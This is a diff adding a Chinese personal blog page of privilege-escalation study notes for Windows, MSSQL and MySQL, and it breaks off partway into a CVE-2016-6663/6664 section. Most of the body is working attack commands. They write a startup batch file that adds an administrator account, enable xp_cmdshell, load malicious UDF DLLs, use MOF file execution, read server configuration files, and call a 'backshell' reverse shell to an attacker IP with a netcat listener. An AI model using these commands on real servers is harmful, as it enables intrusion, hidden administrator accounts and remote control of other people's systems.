@@ -1,0 +1,1253 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="提权,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Windows提权DLL提权lpk.dll劫持添加shirft后门 开机启动项提权开机启动项提权思路： 原理：利用mysql，将后门写入开机自启动项。同时因为是开机自启动，在写入之后，需要重启目标服务器。  这个要求mysql的权限很高，至少是管理员权限甚至是system  12345678910show databases ;use test;show tables;create table b">
+<meta name="keywords" content="提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第三方提权">
+<meta property="og:url" content="https://jeremyekek.github.io/2019/07/09/第三方提权/index.html">
+<meta property="og:site_name" content="EkEk的个人博客">
+<meta property="og:description" content="Windows提权DLL提权lpk.dll劫持添加shirft后门 开机启动项提权开机启动项提权思路： 原理：利用mysql，将后门写入开机自启动项。同时因为是开机自启动，在写入之后，需要重启目标服务器。  这个要求mysql的权限很高，至少是管理员权限甚至是system  12345678910show databases ;use test;show tables;create table b">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-07-18T14:46:06.769Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第三方提权">
+<meta name="twitter:description" content="Windows提权DLL提权lpk.dll劫持添加shirft后门 开机启动项提权开机启动项提权思路： 原理：利用mysql，将后门写入开机自启动项。同时因为是开机自启动，在写入之后，需要重启目标服务器。  这个要求mysql的权限很高，至少是管理员权限甚至是system  12345678910show databases ;use test;show tables;create table b">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"post","offset":20,"b2t":true,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://jeremyekek.github.io/2019/07/09/第三方提权/">
+
+
+
+
+
+  <title>第三方提权 | EkEk的个人博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">EkEk的个人博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jeremyekek.github.io/2019/07/09/第三方提权/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="EkEk">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="EkEk的个人博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">第三方提权</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-18T22:46:06+08:00">
+                2019-07-18
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/学习笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">学习笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/07/09/第三方提权/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/07/09/第三方提权/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h1><h2 id="DLL提权"><a href="#DLL提权" class="headerlink" title="DLL提权"></a>DLL提权</h2><p>lpk.dll劫持添加shirft后门</p>
+<h2 id="开机启动项提权"><a href="#开机启动项提权" class="headerlink" title="开机启动项提权"></a>开机启动项提权</h2><p>开机启动项提权思路：</p>
+<p>原理：利用mysql，将后门写入开机自启动项。同时因为是开机自启动，在写入之后，需要重启目标服务器。</p>
+<blockquote>
+<p>这个要求mysql的权限很高，至少是管理员权限甚至是system</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">show databases ;</span><br><span class="line">use test;</span><br><span class="line">show tables;</span><br><span class="line">create table b (cmd text); </span><br><span class="line">insert into b values (&quot;net user Aspnet123545345! /add&quot;);</span><br><span class="line">insert into b values (&quot;net localgroup administrators Aspnet /add&quot;);</span><br><span class="line">insert into b values (&quot;del b.bat&quot;);</span><br><span class="line">select  from b into outfile &quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\b.bat&quot;;</span><br><span class="line">C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\	#windows2003及xp的路径</span><br><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
+<h2 id="MSSQL提权"><a href="#MSSQL提权" class="headerlink" title="MSSQL提权"></a>MSSQL提权</h2><p><strong>提权思路：</strong></p>
+<ol>
+<li><p>MSSQL在Windows server类的操作系统上，默认具有system权限。</p>
+</li>
+<li><p>获取webshell之后可尝试在服务器各个站点的目录寻找sa的密码（某些站点直接在web应用程序中使用sa连接数据库），一般情况下，.net的站点数据库连接字符串在web.config或者和global.aspx也有可能是编译在DLL文件当中。</p>
+</li>
+<li><p>通过端口扫描查看1433（mssql默认端口）是否对外开放。如果对外开放则使用sql连接器进行提权，如果没有对外开放，则使用webshell自带的mssql数据库连接功能连接至mssql数据库。</p>
+</li>
+<li><p>Sa作为mssql的默认最高权限的账户，在正常情况下，可以通过xp_cmdshell等方式执行系统命令。</p>
+</li>
+</ol>
+<p><strong>提权前提：</strong></p>
+<p>所谓利用数据库进行提权，利用的其实是数据库的运行权限，所以只要我们满足以下条件即可进行提权：</p>
+<ul>
+<li><p>必须获得sa的账号密码或者与sa相同权限的账号密码，且mssql没有被降权。</p>
+</li>
+<li><p>必须可以以某种方式执行sql语句，例如：webshell或者是1433端口的连接。</p>
+<blockquote>
+<p>连接工具：Navicat Premium 12、SQL TOOLS 2.0功能增强版、开源连接工具</p>
+</blockquote>
+</li>
+</ul>
+<ol>
+<li><p>连接数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from master.dbo.sysdatabases	#查看所有数据库名</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看版本信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@version</span><br></pre></td></tr></table></figure>
+<p>验证数据库的权限，sa账号是否被降权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select IS_SRVROLEMEMBER(&apos;sysadmin&apos;)		#返回1是SA权限</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看数据库中是否有xp_cmdshell扩展存储过程插件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&apos;x&apos; and name=&apos;xp_cmdshell&apos;;</span><br><span class="line">select count(*) from master.dbo.sysobjects where xtype=&apos;x&apos; and name =&apos;xp_dirtree&apos;;</span><br><span class="line">#返回值不为0即可</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exec master..xp_cmdshell &apos;ipconfig&apos;</span><br><span class="line">Exec master..xp_dirtree &apos;/&apos;;</span><br></pre></td></tr></table></figure>
+<p>如果如下报错：</p>
+<blockquote>
+<p>Error Message:SQL Server 阻止了对组件 ‘xp_cmdshell’ 的 过程’sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 ‘xp_cmdshell’。有关启用 ‘xp_cmdshell’ 的详细信息，请参阅 SQL Server 联机丛书中的 “外围应用配置器”。</p>
+</blockquote>
+<p>接下来这样操作，修复扩展存储过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#开启xp_cmdshell</span><br><span class="line">EXEC sp_configure &apos;show advanced options&apos;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &apos;xp_cmdshell&apos;,1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>配置选项 ‘show advanced options’ 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。<br>配置选项 ‘xp_cmdshell’ 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。</p>
+<p>出现上面的提示（在你的连接工具中可能没有回显），则说明扩展存储过程已经添加完成</p>
+</blockquote>
+<p>继续执行命令即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exec master..xp_cmdshell &apos;ipconfig&apos;;</span><br></pre></td></tr></table></figure>
+<p><strong>如果xp_cmdshell被删除</strong></p>
+<p>重新加载该可扩展插件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#在系统中加载dll文件</span><br><span class="line">EXEC sp_addextendedproc xp_cmdshell,@dllname =&apos;xplog70.dll&apos;declare @o int; </span><br><span class="line">#重新绑定</span><br><span class="line">sp_addextendedproc &apos;xp_cmdshell&apos;, &apos;xpsql70.dll&apos;;</span><br><span class="line">#开启xp_cmdshell</span><br><span class="line">EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;</span><br><span class="line">EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure>
+<p><strong>xp_cmdshell, xpsql70.dll 均被删除</strong></p>
+<p><code>xpsql70.dll</code> 需要我们重新上传</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\</span><br></pre></td></tr></table></figure>
+<p>接下来重新加载该可扩展插件即可。</p>
+</li>
+</ol>
+<p><strong>sp_oacreate</strong></p>
+<p>从SQL Server 2005 开始，xp_cmdshell默认是禁用的，而且执行xp_cmdshell可能会触发安全警报。下面介绍一些其它通过SQL Server 执行系统命令的方法。</p>
+<p>在xp_cmdshell被删除或者出错情况下，可以充分利用SP_OACreate进行提权。</p>
+<p>参考链接</p>
+<p><a href="https://cloud.tencent.com/developer/article/1180237" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1180237</a></p>
+<p><a href="https://www.cnblogs.com/xiao0/archive/2012/08/09/2630048.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiao0/archive/2012/08/09/2630048.html</a></p>
+<p><strong>SQL Server CLR</strong></p>
+<p><strong>Agent Job</strong></p>
+<p>参考链接<a href="http://bobao.360.cn/learning/detail/3070.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3070.html</a></p>
+<p><strong>其他方式</strong></p>
+<p><a href="http://www.freebuf.com/column/142307.html" target="_blank" rel="noopener">http://www.freebuf.com/column/142307.html</a></p>
+<h2 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h2><p><strong>利用MySQL提权原理：</strong></p>
+<p>1、具有mysql的root权限，且mysql以system权限运行。<br>2、具有执行sql语句的权限，webshell或者外连皆可。</p>
+<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>UDF是mysql的一个拓展接口（Userdefined function 用户自定义函数），是用来拓展Mysql的技术手段。</p>
+<p>提权条件：</p>
+<ol>
+<li><p>拥有mysql的insert和delete权限</p>
+</li>
+<li><p>可以将udf.dll写入到相应目录的权限。</p>
+</li>
+</ol>
+<p>提权方式：</p>
+<ul>
+<li><p><code>udf.php</code> </p>
+</li>
+<li><p>sqlmap</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -d &quot;mysql://root:123456@219.115.1.1:3306/mysql&quot; --os-shell</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>手动操作</p>
+</li>
+</ul>
+<ol>
+<li><p>收集信息</p>
+<ul>
+<li><p>用户信息(当前用户)</p>
+</li>
+<li><p>数据库信息(版本信息，位置)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select user();		#当前用户</span><br><span class="line">select version();	#数据库版本</span><br><span class="line">select @@basedir;	#数据库位置</span><br><span class="line">show variables like &apos;%plugins%&apos;	#查看数据库默认的插件存储位置</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>导出dll文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell(dll文件中的函数名) returns string soname &apos;myudf.dll&apos;;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>myudf.dll文件在导出的过程中根据不同类型的数据库，放置的位置是不一样的。</p>
+<p>mysql &lt;= 5.1的位置在 c:/windows/system32/</p>
+<p>mysql  &gt;  5.1的位置 MySQL\Lib\Plugin\</p>
+</blockquote>
+<p>DLL文件通过c++、c#等将恶意shellcode封装到dll文件中，其中封装的函数名必须要知道（mycmd）</p>
+<p>导入方式：</p>
+<ul>
+<li><p>通过菜刀等webshell管理工具直接上传（不一定能够上传成功）</p>
+</li>
+<li><p>找一个能够上传的地方，<code>c:\\tmp</code> 然后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;c:\\temp\\myudf.dll&apos;) into dumpfile &apos;c:\\phpstudy\\MySQL\\lib\\plugin\\myudf.dll&apos;;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>要求：</p>
+<ol>
+<li><p>lib下存在plugin目录；</p>
+<p>没有目录需要创建：</p>
+<ol>
+<li><p>通过菜刀等webshell管理工具手工创建</p>
+</li>
+<li><p>NTFS ADS流写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;   #查找到mysql的目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&apos;;	#利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select cmdshell(&apos;系统命令&apos;)；	#注意函数名</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>删除函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drop function cmdhell;			#注意函数名</span><br><span class="line">delete from mysql.func where name=&apos;cmdshell&apos;;</span><br><span class="line">#删除udf.dll</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><strong>无法获取webshell提权</strong></p>
+<p>1.连接mysql</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -h ip -uroot -p</span><br><span class="line">phpmyadmin</span><br><span class="line">Navicat for MySQL</span><br></pre></td></tr></table></figure>
+<p>2.查看数据库版本和数据路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SELECT VERSION( );</span><br><span class="line">Select @@datadir;</span><br><span class="line">5.1以下版本，将dll导入到c:/windows或者c:/windows/system32/</span><br><span class="line">5.1以上版本 通过以下查询来获取插件路径：</span><br><span class="line">SHOW VARIABLES WHERE Variable_Name LIKE &quot;%dir&quot;;</span><br><span class="line">show variables like &apos;%plugin%&apos; ;</span><br><span class="line">select load_file(&apos;C:/phpStudy/Apache/conf/httpd.conf&apos;)</span><br><span class="line">select load_file(&apos;C:/phpStudy/Apache/conf/vhosts.conf&apos;)</span><br><span class="line">select load_file(&apos;C:/phpStudy/Apache/conf/extra/vhosts.conf&apos;)</span><br><span class="line">select load_file(&apos;C:/phpStudy/Apache/conf/extra/httpd.conf&apos;)</span><br><span class="line">select load_file(&apos;d:/phpStudy/Apache/conf/vhosts.conf&apos;)</span><br></pre></td></tr></table></figure>
+<p>3.修改mysql.txt</p>
+<p>Mysql.txt为udf.dll的二进制文件转成十六进制代码。</p>
+<p>（1）先执行导入ghost表中的内容</p>
+<p>修改以下代码的末尾代码 select backshell(“YourIP”,4444);</p>
+<p>（2）导出文件到某个目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c:/windows/system32/mysql.dll</span><br><span class="line">c:/phpStudy/MySQL/lib/plugin/mysql.dll</span><br><span class="line">E:/PHPnow-1.5.6/MySQL-5.0.90/lib/plugin/mysql.dll</span><br><span class="line">select data from Ghost into dumpfile &apos;C:/websoft/MySQL/MySQL Server 5.5/lib/plugin/mysqldll.dll</span><br><span class="line">C:\Program Files\MySQL\MySQL Server 5.1\lib/plugin/mysqldll.dll</span><br></pre></td></tr></table></figure>
+<p>（3）查看FUNCTION中是否存在cmdshell和backshell</p>
+<p>存在则删除：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drop FUNCTION cmdshell;//删除cmdshell</span><br><span class="line">drop FUNCTION backshell;//删除backshell</span><br></pre></td></tr></table></figure>
+<p>创建backshell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select backshell(&quot;192.192.192.1&quot;,44444);//修改192.192.192.1为你的IP和端口</span><br></pre></td></tr></table></figure>
+<p>在具备独立主机的服务器上执行监听:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -l -p 44444</span><br></pre></td></tr></table></figure>
+<p>执行查询：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select backshell(&quot;192.192.192.1&quot;,44444);//修改192.192.192.1为你的IP和端口</span><br></pre></td></tr></table></figure>
+<p>4.获取webshell后添加用户命令</p>
+<p>注意如果不能直接执行，则需要到<code>c:\windows\system32\</code>下执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user antian365 www.xianzhi.aliyun.com /add </span><br><span class="line">net localgroup administrators antian365</span><br></pre></td></tr></table></figure>
+<p><strong>反弹端口连接提权</strong></p>
+<p>假如我们扫到了一个mysql的root弱密码，并且可以外连，但是服务器上面的网站又无法Getshell，这时我们怎么办呢？</p>
+<p>1、利用mysql客户端工具连接mysql服务器，然后执行下面的操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql.exe -h 172.16.10.11 -uroot -p</span><br><span class="line">Enter password:</span><br><span class="line">mysql&gt; \. c:\mysql.txt</span><br><span class="line">mysql&gt;select backshell(&quot;YourIP&quot;,2010);</span><br></pre></td></tr></table></figure>
+<p>2、本地监听你反弹的端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -vv -l -p 2010</span><br></pre></td></tr></table></figure>
+<p>成功后，你将获得一个system权限的cmdshell，其实这个也是利用的UDF提权。</p>
+<p>实验环境：phpStudy 默认安装的mysql数据库 5.5.40版本</p>
+<p>mysql.txt：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">set @a=concat(‘‘,[mysql.txt]);</span><br><span class="line">create table Ghost(data LONGBLOB);</span><br><span class="line">insert into Ghost values(&quot;&quot;);update Ghost set data = @a;</span><br><span class="line">select data from Ghost into DUMPFILE ‘c:\\windows\\system32\\udf.dll‘;</span><br><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME ‘udf.dll‘;</span><br><span class="line">select backshell(‘‘);</span><br></pre></td></tr></table></figure>
+<h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><p><strong>利用条件：</strong></p>
+<ul>
+<li>windows系统，版本 <code>2003</code> 、<code>xp</code></li>
+<li>mysql 版本低于5.7，原因开启了<code>secure-file-priv</code></li>
+<li>已知数据库账号密码</li>
+<li><code>c:/windows/system32/wbem/mof/</code>目录有写权限</li>
+</ul>
+<p><strong>MOF文件：</strong></p>
+<p>mof是windows系统的一个文件，在 <code>c:/windows/system32/wbem/mof/nullevt.mof</code> 叫做 <code>托管对象格式</code> 其作用是每隔五秒就会去监控进程创建和死亡。</p>
+<p><strong>提权原理：</strong></p>
+<p>有了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p>
+<p>mof文件通过Mofcomp.exe编译执行。</p>
+<p><strong>流程：</strong></p>
+<ol>
+<li><p>首先找个可写的目录，将我们的MOF文件上传上去。</p>
+</li>
+<li><p>执行以下sql语句，mof文件内的命令便会执行。</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;C:/wmpub/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li><p>提权后续处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt	#停止服务</span><br><span class="line">rd/s/q C:\WINDOWS\system32\wbem\Repository\	#删除文件夹</span><br><span class="line">net start winmgmt	#启动服务</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>有一些局限性，系统限制和不好取得回显.</p>
+</blockquote>
+</li>
+</ol>
+<p><strong>快速提权方法：</strong></p>
+<ul>
+<li>mof.php/asp</li>
+<li>Metasploit的exp模块</li>
+<li>Cobalt strike</li>
+</ul>
+<h3 id="CVE-2016-6663-amp-4"><a href="#CVE-2016-6663-amp-4" class="headerlink" title="CVE-2016-6663&amp;4"></a>CVE-2016-6663&amp;4</h3><p><a href="https://uuzdaisuki.com/2018/07/02/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">参考链接</a></p>
+<p>上面两种方式条件都太过严苛，应对一些新的系统就没有用武之地了，所以再介绍一下利用下面两个CVE配合起来提权的方式，相对需求条件要宽松的多，很多情况都可以成功提权。</p>
+<p><strong>CVE-2016-6663</strong></p>
+<p>CVE-2016-6663是竞争条件（race condition）漏洞，它能够让一个低权限账号（拥有CREATE/INSERT/SELECT权限）提升权限并且以系统用户身份执行任意代码。也就是说，我们可以通过他得到一整个mysql的权限。</p>
+<p><strong>CVE-2016-6664</strong></p>
+<p>CVE-2016-6664是root权限提升漏洞，这个漏洞可以让拥有MySQL系统用户权限的攻击者提升权限至root，以便进一步攻击整个系统。</p>
+<p>导致这个问题的原因其实是因为MySQL对错误日志以及其他文件的处理不够安全，这些文件可以被替换成任意的系统文件，从而被利用来获取root权限。</p>
+<p>可以看到，两个cve分别是用来将低权限的www-data权限提升为mysql权限，然后再将mysql提升为root权限</p>
+<p><strong>CVE-2016-6663利用条件</strong></p>
+<ul>
+<li>1.已经getshell，获得www-data权限</li>
+<li>2.获取到一个拥有create,drop,insert,select权限的数据库账号，密码</li>
+<li>3.提权过程需要在交互式的shell环境中运行，所以需要反弹shell再提权</li>
